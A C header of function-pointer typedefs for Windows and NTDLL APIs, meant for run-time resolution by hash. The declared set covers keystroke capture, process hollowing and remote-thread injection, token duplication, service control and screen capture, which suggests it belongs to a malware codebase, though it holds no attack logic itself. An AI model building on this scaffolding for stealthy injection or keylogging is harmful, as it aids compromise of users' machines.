#pragma once

#include "core\winapi_simple.h"
#include "core\api_funcs_hash.h"

typedef VOID ( WINAPI *typeExitProcess)( UINT uExitCode ); //KERNEL32
typedef BOOL ( WINAPI *typeGetComputerNameA)( LPTSTR lpBuffer, LPDWORD lpnSize ); //KERNEL32
typedef BOOL ( WINAPI *typeGetKeyboardState)( PBYTE lpKeyState ); //USER32
typedef DWORD ( WINAPI *typeGetCurrentThreadId)(); //KERNEL32
typedef HKL ( WINAPI *typeGetKeyboardLayout)( DWORD idThread ); //USER32
typedef int ( WINAPI *typeToAsciiEx)( UINT uVirtKey, UINT uScanCode, const BYTE *lpKeyState, LPWORD lpChar, UINT uFlags, HKL dwhkl ); //USER32
typedef LPTSTR ( WINAPI *typeGetCommandLineA)(); //KERNEL32
typedef HANDLE ( WINAPI *typeGetCurrentProcess)(); //KERNEL32
typedef VOID ( WINAPI *typeSleep)( DWORD dwMilliseconds ); //KERNEL32
typedef HMODULE ( WINAPI *typeLoadLibraryA)( LPCTSTR lpFileName ); //KERNEL32
typedef HMODULE ( WINAPI *typeLoadLibraryW)( LPCWSTR lpFileName ); //KERNEL32
typedef BOOL (WINAPI *typeFreeLibrary)( HMODULE hModule ); //KERNEL32
typedef FARPROC ( WINAPI *typeGetProcAddress)( HMODULE hModule, LPCSTR lpProcName ); //KERNEL32
typedef SC_HANDLE ( WINAPI *typeOpenSCManagerA)( LPCTSTR lpMachineName, LPCTSTR lpDatabaseName, DWORD dwDesiredAccess ); //ADVAPI32
typedef SC_HANDLE ( WINAPI *typeOpenSCManagerW)( LPCWSTR lpMachineName, LPCWSTR lpDatabaseName, DWORD dwDesiredAccess ); //ADVAPI32
typedef SC_HANDLE ( WINAPI *typeOpenServiceA)( SC_HANDLE hSCManager, LPCTSTR lpServiceName, DWORD dwDesiredAccess ); //ADVAPI32
typedef SC_HANDLE ( WINAPI *typeOpenServiceW)( SC_HANDLE hSCManager, LPCWSTR lpServiceName, DWORD dwDesiredAccess ); //ADVAPI32
typedef BOOL ( WINAPI *typeChangeServiceConfig2A)(  SC_HANDLE hService, DWORD dwInfoLevel, LPVOID lpInfo ); //ADVAPI32
typedef BOOL ( WINAPI *typeCloseServiceHandle)( SC_HANDLE hSCObject ); //ADVAPI32
typedef BOOL ( WINAPI *typeMoveFileA)(  LPCTSTR lpExistingFileName, LPCTSTR lpNewFileName ); //KERNEL32
typedef NTSTATUS ( WINAPI *typeRtlAdjustPrivilege)( ULONG Privilege, BOOLEAN NewValue, BOOLEAN ForThread, PBOOLEAN OldValue ); //NTDLL
typedef VOID ( WINAPI *typeRtlGetNtVersionNumbers)( LPDWORD pMajor, LPDWORD pMinor, LPDWORD pBuild ); //NTDLL
typedef HANDLE ( WINAPI *typeCreateFileMappingA)( HANDLE hFile, LPSECURITY_ATTRIBUTES lpAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCTSTR lpName ); //KERNEL32
typedef HANDLE ( WINAPI *typeCreateFileMappingW)( HANDLE hFile, LPSECURITY_ATTRIBUTES lpAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCWSTR lpName ); //KERNEL32
typedef LPVOID ( WINAPI *typeMapViewOfFile)( HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap ); //KERNEL32
typedef BOOL ( WINAPI *typeUnmapViewOfFile)( LPCVOID lpBaseAddress ); //KERNEL32
typedef BOOL ( WINAPI *typeCloseHandle)( HANDLE hObject ); //KERNEL32
typedef BOOL ( WINAPI *typeEnumServicesStatusExA)( SC_HANDLE hSCManager, SC_ENUM_TYPE InfoLevel, DWORD dwServiceType, DWORD dwServiceState, LPBYTE lpServices, DWORD cbBufSize, LPDWORD pcbBytesNeeded, LPDWORD lpServicesReturned, LPDWORD lpResumeHandle, LPCTSTR pszGroupName ); //ADVAPI32
typedef DWORD ( WINAPI *typeGetLastError)(); //KERNEL32
typedef BOOL ( WINAPI *typeSetServiceStatus)( SERVICE_STATUS_HANDLE hServiceStatus, LPSERVICE_STATUS lpServiceStatus ); //ADVAPI32
typedef SERVICE_STATUS_HANDLE ( WINAPI *typeRegisterServiceCtrlHandlerA)( LPCTSTR lpServiceName, LPHANDLER_FUNCTION lpHandlerProc ); //ADVAPI32
typedef BOOL ( WINAPI *typeControlService)( SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus ); //ADVAPI32
typedef BOOL ( WINAPI *typeStartServiceCtrlDispatcherA)( const SERVICE_TABLE_ENTRY *lpServiceTable ); //ADVAPI32
typedef HANDLE ( WINAPI *typeCreateEventA)( LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCTSTR lpName ); //KERNEL32
typedef DWORD ( WINAPI *typeWaitForSingleObject)( HANDLE hHandle, DWORD dwMilliseconds ); //KERNEL32
typedef BOOL ( WINAPI *typeSetEvent)( HANDLE hEvent ); //KERNEL32
typedef BOOL ( WINAPI *typeWritePrivateProfileStringA)( LPCTSTR lpAppName, LPCTSTR lpKeyName, LPCTSTR lpString, LPCTSTR lpFileName ); //KERNEL32
typedef HMODULE ( WINAPI *typeGetModuleHandleA)( LPCTSTR lpModuleName ); //KERNEL32
typedef HMODULE ( WINAPI *typeGetModuleHandleW)( LPCWSTR lpModuleName ); //KERNEL32
typedef DWORD ( WINAPI *typeGetFileAttributesA)( LPCTSTR lpFileName ); //KERNEL32
typedef BOOL ( WINAPI *typeEnumChildWindows)( HWND hWndParent, WNDENUMPROC lpEnumFunc, LPARAM lParam ); //USER32
typedef BOOL ( WINAPI *typeEnumWindows)( WNDENUMPROC lpEnumFunc, LPARAM lParam ); //USER32
typedef BOOL ( WINAPI *typeIsWindowEnabled)( HWND hWnd ); //USER32
typedef DWORD ( WINAPI *typeGetPrivateProfileStringA)( LPCTSTR lpAppName, LPCTSTR lpKeyName, LPCTSTR lpDefault, LPTSTR lpReturnedString, DWORD nSize, LPCTSTR lpFileName ); //KERNEL32
typedef HWND ( WINAPI *typeFindWindowA)( LPCTSTR lpClassName, LPCTSTR lpWindowName ); //USER32
typedef DWORD ( WINAPI *typeGetTempPathA)( DWORD nBufferLength, LPTSTR lpBuffer ); //KERNEL32
typedef UINT ( WINAPI *typeGetTempFileNameA)( LPCTSTR lpPathName, LPCTSTR lpPrefixString, UINT uUnique, LPTSTR lpTempFileName ); //KERNEL32
typedef BOOL ( WINAPI *typeMoveFileExA)( LPCTSTR lpExistingFileName, LPCTSTR lpNewFileName, DWORD dwFlags ); //KERNEL32
typedef BOOL ( WINAPI *typeSetCurrentDirectoryA)( LPCTSTR lpPathName ); //KERNEL32
typedef BOOL ( WINAPI *typeGetVersionExA)( LPOSVERSIONINFO lpVersionInfo ); //KERNEL32
typedef HANDLE ( WINAPI *typeCreateFileA)( LPCTSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile ); //KERNEL32
typedef HANDLE ( WINAPI *typeCreateFileW)( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile ); //KERNEL32
typedef BOOL ( WINAPI *typeWriteFile)( HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped ); //KERNEL32
typedef LONG ( WINAPI *typeRegOpenKeyExA)( HKEY hKey, LPCTSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult ); //ADVAPI32
typedef LONG ( WINAPI *typeRegSetValueExA)( HKEY hKey, LPCTSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData ); //ADVAPI32
typedef LONG ( WINAPI *typeRegCloseKey)( HKEY hKey ); //ADVAPI32
typedef BOOL ( WINAPI *typeExitWindowsEx)( UINT uFlags, DWORD dwReason ); //USER32
typedef BOOL ( WINAPI *typeCryptBinaryToStringA)( const BYTE *pbBinary, DWORD cbBinary, DWORD dwFlags, LPTSTR pszString, DWORD *pcchString ); //CRYPT32
typedef BOOL ( WINAPI *typeCryptStringToBinaryA)( LPCTSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags ); //CRYPT32
typedef BOOL ( WINAPI *typeCryptAcquireContextA)( HCRYPTPROV *phProv, LPCTSTR pszContainer, LPCTSTR pszProvider, DWORD dwProvType, DWORD dwFlags ); //ADVAPI32
typedef BOOL ( WINAPI *typeCryptImportKey)( HCRYPTPROV hProv, BYTE *pbData, DWORD dwDataLen, HCRYPTKEY hPubKey, DWORD dwFlags, HCRYPTKEY *phKey ); //ADVAPI32
typedef BOOL ( WINAPI *typeCryptSetKeyParam)( HCRYPTKEY hKey, DWORD dwParam, const BYTE *pbData, DWORD dwFlags ); //ADVAPI32
typedef BOOL ( WINAPI *typeCryptDestroyKey)( HCRYPTKEY hKey ); //ADVAPI32
typedef BOOL ( WINAPI *typeCryptReleaseContext)( HCRYPTPROV hProv, DWORD dwFlags ); //ADVAPI32
typedef BOOL ( WINAPI *typeCryptEncrypt)( HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen, DWORD dwBufLen ); //ADVAPI32
typedef BOOL ( WINAPI *typeCryptDecrypt)( HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen ); //ADVAPI32
typedef void ( WINAPI *typeOutputDebugStringA)( LPCTSTR lpOutputString ); //KERNEL32
typedef HANDLE ( WINAPI *typeCreateFile)( LPCTSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile ); //KERNEL32
typedef LPVOID ( WINAPI *typeVirtualAlloc)( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect ); //KERNEL32
typedef BOOL ( WINAPI *typeDeviceIoControl)( HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped ); //KERNEL32
typedef BOOL ( WINAPI *typeIsWow64Process)( HANDLE hProcess, PBOOL Wow64Process ); //KERNEL32
typedef HDC ( WINAPI *typeCreateCompatibleDC)( HDC hdc ); //GDI32
typedef HBITMAP ( WINAPI *typeCreateCompatibleBitmap)( HDC hdc, int nWidth, int nHeight ); //GDI32
typedef BOOL ( WINAPI *typeDeleteObject)( HGDIOBJ hObject ); //GDI32
typedef HDC ( WINAPI *typeGetDC)( HWND hWnd ); //USER32
typedef BOOL ( WINAPI *typeBeginPath)( HDC hdc ); //GDI32
typedef BOOL ( WINAPI *typePolyDraw)( HDC hdc, const POINT *lppt, const BYTE *lpbTypes, int cCount ); //GDI32
typedef BOOL ( WINAPI *typeEndPath)( HDC hdc ); //GDI32
typedef BOOL ( WINAPI *typeFlattenPath)( HDC hdc ); //GDI32
typedef BOOL ( WINAPI *typeVirtualFree)( LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType ); //KERNEL32
typedef BOOL ( WINAPI *typeVirtualFreeEx)( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType ); //KERNEL32
typedef BOOL ( WINAPI *typeDeleteDC)( HDC hdc ); //GDI32
typedef void ( WINAPI *typeGetSystemInfo)( LPSYSTEM_INFO lpSystemInfo ); //KERNEL32
typedef HMODULE ( WINAPI *typeLoadLibraryExA)( LPCTSTR lpFileName, HANDLE hFile, DWORD dwFlags ); //KERNEL32
typedef DWORD ( WINAPI *typeGetProcessId)( HANDLE Process ); //KERNALE32
typedef DWORD ( WINAPI *typeResumeThread)( HANDLE hThread ); //KERNEL32
typedef BOOL ( WINAPI *typeTerminateThread)( HANDLE hThread, DWORD dwExitCode ); //KERNEL32
typedef PIMAGE_NT_HEADERS ( WINAPI *typeCheckSumMappedFile)(  PVOID BaseAddress, DWORD FileLength, PDWORD HeaderSum, PDWORD CheckSum ); //IMAGEHLP
typedef BOOL ( WINAPI *typeReadFile)( HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped ); //KERNEL32
typedef DWORD ( WINAPI *typeGetFileSize)( HANDLE hFile, LPDWORD lpFileSizeHigh ); //KERNEL32
typedef BOOL ( WINAPI *typeDeleteFileA)( LPCTSTR lpFileName ); //KERNEL32
typedef BOOL ( WINAPI *typeCopyFileA)( LPCTSTR lpExistingFileName, LPCTSTR lpNewFileName, BOOL bFailIfExists ); //KERNEL32
typedef BOOL ( WINAPI *typeSetFileAttributesA)( LPCTSTR lpFileName, DWORD dwFileAttributes ); //KERNEL32
typedef HANDLE ( WINAPI *typeFindFirstFileA)( LPCTSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData ); //KERNEL32
typedef BOOL ( WINAPI *typeFindNextFileA)( HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData ); //KERNEL32
typedef BOOL ( WINAPI *typeFindClose)( HANDLE hFindFile ); //KERNEL32
typedef BOOL ( WINAPI *typeDestroyWindow)( HWND hWnd ); //USER32
typedef LRESULT ( WINAPI *typeDispatchMessageA)( const MSG *lpmsg ); //USER32
typedef LRESULT ( WINAPI *typeDispatchMessageW)( const MSG *lpmsg ); //USER32
typedef BOOL ( WINAPI *typeGetMessageA)( LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax ); //USER32
typedef BOOL ( WINAPI *typeGetMessageW)( LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax  ); //USER32
typedef BOOL ( WINAPI *typeVirtualProtect)( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect ); //KERNEL32
typedef BOOL ( WINAPI *typePeekMessageA)( LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg ); //USER32
typedef BOOL ( WINAPI *typePeekMessageW)( LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg ); //USER32
typedef NTSTATUS ( WINAPI *typeZwResumeThread)( DWORD ThreadHandle, DWORD PreviousSuspendCount ); //NTDLL
typedef HRESULT ( WINAPI *typeObtainUserAgentString)( DWORD dwOption, LPSTR pcszUAOut, DWORD *cbSize ); //URLMON
typedef VOID ( WINAPI *typeKiUserApcDispatcher)( PVOID Unused1, PVOID Unused2, PVOID Unused3, PVOID ContextStart, PVOID ContextBody ); //NTDLL
typedef BOOL ( WINAPI *typeReadProcessMemory)( HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead ); //KERNEL32
typedef BOOL ( WINAPI *typeEnumProcessModules)( HANDLE hProcess, HMODULE *lphModule, DWORD cb, LPDWORD lpcbNeeded ); //PSAPI
typedef PVOID ( WINAPI *typeRtlImageNtHeader)( PVOID BaseAddress ); //NTDLL
typedef SIZE_T ( WINAPI *typeVirtualQueryEx)( HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength ); //KERNEL32
typedef NTSTATUS ( WINAPI *typeNtClose)( HANDLE hObject ); //NTDLL
typedef SIZE_T ( WINAPI *typeVirtualQuery)( LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength ); //KERNEL32
typedef HANDLE ( WINAPI *typeOpenProcess)( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId ); //KERNEL32
typedef HANDLE ( WINAPI *typeOpenEventA)( DWORD dwDesiredAccess, BOOL bInheritHandle, LPCTSTR lpName ); //KERNEL32
typedef LONG ( WINAPI *typeGetWindowLongA)( HWND hWnd, int nIndex ); //USER32
typedef LONG ( WINAPI *typeSetWindowLongA)( HWND hWnd, int nIndex, LONG dwNewLong ); //USER32
typedef BOOL ( WINAPI *typeSendNotifyMessageA)( HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam ); //USER32
typedef NTSTATUS ( WINAPI *typeNtUnmapViewOfSection)( HANDLE	hProcess, PVOID pBaseAddress ); //NTDLL
typedef NTSTATUS ( WINAPI *typeZwAllocateVirtualMemory)( HANDLE ProcessHandle, PVOID *BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect ); //NTDLL
typedef NTSTATUS ( WINAPI *typeZwWriteVirtualMemory)( HANDLE ProcessHandle, PVOID  BaseAddress, PVOID  Buffer, ULONG  NumberOfBytesToWrite, PULONG NumberOfBytesWritten ); //NTDLL
typedef NTSTATUS ( WINAPI *typeZwClose)( HANDLE Handle ); //NTDLL
typedef BOOL ( WINAPI *typeWriteProcessMemory)( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten ); //KERNEL32
typedef NTSTATUS ( WINAPI *typeZwSetContextThread)( HANDLE ThreadHandle, PCONTEXT Context ); //NTDLL
typedef HANDLE ( WINAPI *typeCreateRemoteThread)( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId ); //KERNEL32
typedef HANDLE ( WINAPI *typeHeapCreate)( DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize ); //KERNEL32
typedef BOOL ( WINAPI *typeHeapDestroy)( HANDLE hHeap ); //KERNEL32
typedef LPVOID ( WINAPI *typeHeapAlloc)( HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes ); //KERNEL32
typedef LPVOID ( WINAPI *typeHeapReAlloc)( HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes ); //KERNEL32
typedef BOOL ( WINAPI *typeHeapFree)( HANDLE hHeap, DWORD dwFlags, LPVOID lpMem ); //KERNEL32
typedef BOOL ( WINAPI *typeDuplicateHandle)( HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions ); //KERNEL32
typedef DWORD ( WINAPI *typeGetModuleFileNameExA)( HANDLE hProcess, HMODULE hModule, LPTSTR lpFilename, DWORD nSize ); //PSAPI
typedef HANDLE ( WINAPI *typeCreateThread)( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId ); //KERNEL32
typedef void ( WINAPI *typeInitializeCriticalSection)( LPCRITICAL_SECTION lpCriticalSection ); //KERNEL32
typedef void ( WINAPI *typeEnterCriticalSection)( LPCRITICAL_SECTION lpCriticalSection ); //KERNEL32
typedef void ( WINAPI *typeLeaveCriticalSection)( LPCRITICAL_SECTION lpCriticalSection ); //KERNEL32
typedef UINT ( WINAPI *typeGetSystemDirectoryA)( LPTSTR lpBuffer, UINT uSize ); //KERNEL32
typedef DWORD ( WINAPI *typeGetModuleFileNameA)( HMODULE hModule, LPTSTR lpFilename, DWORD nSize ); //KERNEL32
typedef HRESULT ( WINAPI *typeSHGetFolderPathA)( HWND hwndOwner, int nFolder, HANDLE hToken, DWORD dwFlags, LPTSTR pszPath ); //SHELL32
typedef PTSTR ( WINAPI *typePathFindFileNameA)( LPCSTR pPath ); //SHLWAPI
typedef PTSTR ( WINAPI *typePathFindExtensionA)( LPCSTR pszPath ); //SHLWAPI
typedef int ( WINAPI *typeSHCreateDirectoryExA)( HWND hwnd, LPCTSTR pszPath, const SECURITY_ATTRIBUTES *psa ); //SHELL32
typedef int ( WINAPI *typeSHFileOperationA)( LPSHFILEOPSTRUCT lpFileOp ); //SHELL32
typedef BOOL ( WINAPI *typeFlushFileBuffers)( HANDLE hFile ); //KERNEL32
typedef BOOL ( WINAPI *typeInitializeSecurityDescriptor)( PSECURITY_DESCRIPTOR pSecurityDescriptor, DWORD dwRevision ); //ADVAPI32
typedef BOOL ( WINAPI *typeSetSecurityDescriptorDacl)( PSECURITY_DESCRIPTOR pSecurityDescriptor, BOOL bDaclPresent, PACL pDacl, BOOL bDaclDefaulted ); //ADVAPI32
typedef HANDLE ( WINAPI *typeCreateNamedPipeA)( LPCTSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes ); //KERNEL32
typedef BOOL ( WINAPI *typeConnectNamedPipe)( HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped ); //KERNEL32
typedef BOOL ( WINAPI *typeDisconnectNamedPipe)( HANDLE hNamedPipe ); //KERNEL32
typedef BOOL ( WINAPI *typeOpenProcessToken)( HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle ); //KERNEL32
typedef BOOL ( WINAPI *typeDuplicateTokenEx)( HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken ); //KERNEL32
typedef BOOL ( WINAPI *typeCreateProcessAsUserA)( HANDLE hToken, LPCTSTR lpApplicationName, LPTSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCTSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation ); //KERNEL32
typedef BOOL ( WINAPI *typeCreateProcessA)( LPCTSTR lpApplicationName, LPTSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCTSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation ); //KERNEL32
typedef BOOL ( WINAPI *typeGetExitCodeProcess)( HANDLE hProcess, LPDWORD lpExitCode ); //KERNEL32
typedef DWORD ( WINAPI *typeGetCurrentProcessId)(); //KERNEL32
typedef DWORD ( WINAPI *typeGetWindowThreadProcessId)( HWND hWnd, LPDWORD lpdwProcessId ); //USER32
typedef HANDLE ( WINAPI *typeCreateToolhelp32Snapshot)( DWORD dwFlags, DWORD th32ProcessID ); //KERNEL32
typedef HWND ( WINAPI *typeFindWindowA)( LPCTSTR lpClassName, LPCTSTR lpWindowName ); //USER32
typedef BOOL ( WINAPI *typeTerminateProcess)( HANDLE hProcess, UINT uExitCode ); //KERNEL32
typedef HANDLE ( WINAPI *typeOpenThread)( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId ); //KERNEL32
typedef DWORD ( WINAPI *typeSuspendThread)( HANDLE hThread ); //KERNEL32
typedef BOOL ( WINAPI *typeGetThreadContext)( HANDLE hThread, LPCONTEXT lpContext ); //KERNEL32
typedef LPVOID ( WINAPI *typeVirtualAllocEx)( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect ); //KERNEL32
typedef BOOL ( WINAPI *typeAttachThreadInput)( DWORD idAttach, DWORD idAttachTo, BOOL fAttach ); //USER32
typedef BOOL ( WINAPI *typeBlockInput)( BOOL fBlockIt ); //USER32
typedef BOOL ( WINAPI *typePostMessageA)( HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam ); //USER32
typedef DWORD ( WINAPI *typeWaitForInputIdle)( HANDLE hProcess, DWORD dwMilliseconds ); //USER32
typedef DWORD ( WINAPI *typeGetTickCount)(); //KERNEL32
typedef LONG ( WINAPI *typeRegCreateKeyExA)( HKEY hKey, LPCTSTR lpSubKey, DWORD Reserved, LPTSTR lpClass, DWORD dwOptions, REGSAM samDesired, LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition ); //ADVAPI32
typedef LONG ( WINAPI *typeRegQueryValueExA)( HKEY hKey, LPCTSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData ); //ADVAPI32
typedef LONG ( WINAPI *typeRegDeleteValueA)( HKEY hKey, LPCTSTR lpValueName ); //ADVAPI32
typedef BOOL ( WINAPI *typeQueryServiceStatusEx)( SC_HANDLE hService, SC_STATUS_TYPE InfoLevel, LPBYTE lpBuffer, DWORD cbBufSize, LPDWORD pcbBytesNeeded ); //ADVAPI32
typedef BOOL ( WINAPI *typeStartServiceA)( SC_HANDLE hService, DWORD dwNumServiceArgs, LPCTSTR *lpServiceArgVectors ); //ADVAPI32
typedef BOOL ( WINAPI *typeChangeServiceConfigA)( SC_HANDLE hService, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCTSTR lpBinaryPathName, LPCTSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCTSTR lpDependencies, LPCTSTR lpServiceStartName, LPCTSTR lpPassword, LPCTSTR lpDisplayName ); //ADVAPI32
typedef int ( WINAPI *typeWSAStartup)( WORD wVersionRequested, LPWSADATA lpWSAData ); //WS2_32
typedef int ( WINAPI *typeWSACleanup)(); //WS2_32
typedef struct hostent* ( WINAPI *typegethostbyname)( const char *name ); //WS2_32
typedef char* ( WINAPI *typeinet_ntoa)( struct in_addr in ); //WS2_32
typedef SOCKET ( WINAPI *typesocket)( int af, int type, int protocol ); //WS2_32
typedef u_short ( WINAPI *typehtons)( u_short hostshort ); //WS2_32
typedef unsigned long ( WINAPI *typeinet_addr)( const char *cp ); //WS2_32
typedef int ( WINAPI *typeconnect)( SOCKET s, const struct sockaddr *name, int namelen ); //WS2_32
typedef int ( WINAPI *typeclosesocket)( SOCKET s ); //WS2_32
typedef int ( WINAPI *typesend)( SOCKET s, const char *buf, int len, int flags ); //WS2_32
typedef int ( WINAPI *typeselect)( int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, const struct timeval *timeout ); //WS2_32
typedef int ( WINAPI *typerecv)( SOCKET s, char *buf, int len, int flags ); //WS2_32
typedef int ( WINAPI *typebind)( SOCKET s, const struct sockaddr *name, int namelen ); //WS2_32
typedef int ( WINAPI *typelisten)( SOCKET s, int backlog ); //WS2_32
typedef SOCKET ( WINAPI *typeaccept)( SOCKET s, struct sockaddr *addr, int *addrlen ); //WS2_32
typedef int ( WINAPI *typewvsprintfA)( LPTSTR lpOutput, LPCTSTR lpFmt, va_list arglist ); //USER32
typedef int ( WINAPI *typeMultiByteToWideChar)( UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar ); //KERNEL32
typedef int ( WINAPI *typeWideCharToMultiByte)( UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar ); //KERNEL32
typedef int ( WINAPI *typeGetWindowTextA)( HWND hWnd, LPTSTR lpString, int nMaxCount ); //USER32
typedef int ( WINAPI *typeGetClassNameA)( HWND hWnd, LPTSTR lpClassName, int nMaxCount ); //USER32
typedef HWND ( WINAPI *typeGetParent)( HWND hWnd ); //USER32
typedef HWND ( WINAPI *typeGetDesktopWindow)(); //USER32
typedef HDC ( WINAPI *typeGetWindowDC)( HWND hWnd ); //USER32
typedef BOOL ( WINAPI *typeGetWindowRect)( HWND hWnd, LPRECT lpRect ); //USER32
typedef HGDIOBJ ( WINAPI *typeSelectObject)( HDC hdc, HGDIOBJ hgdiobj ); //GDI32
typedef BOOL ( WINAPI *typeBitBlt)( HDC hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, HDC hdcSrc, int nXSrc, int nYSrc, DWORD dwRop ); //GDI32
typedef int ( WINAPI *typeReleaseDC)( HWND hWnd, HDC hDC ); //USER32
typedef HRESULT ( WINAPI *typeCreateStreamOnHGlobal)( HGLOBAL hGlobal, BOOL fDeleteOnRelease, LPSTREAM *ppstm ); //OLE32
typedef BOOL ( WINAPI *typeCreateWellKnownSid)( WELL_KNOWN_SID_TYPE WellKnownSidType, PSID DomainSid, PSID pSid, DWORD *cbSid ); //ADVAPI32
typedef BOOL ( WINAPI *typeLookupAccountSidW)( LPCWSTR lpSystemName, PSID lpSid, LPWSTR lpName, LPDWORD cchName, LPWSTR lpReferencedDomainName, LPDWORD cchReferencedDomainName, PSID_NAME_USE peUse ); //ADVAPI32
typedef int ( WINAPI *typewvsprintfW)( LPWSTR lpOutput, LPCWSTR lpFmt, va_list arglist ); //KERNEL32
typedef void ( WINAPI *typeGetLocalTime)( LPSYSTEMTIME lpSystemTime ); //KERNEL32
typedef int ( WINAPI *typegetsockname)( SOCKET s, struct sockaddr *name, int *namelen ); //WS2_32
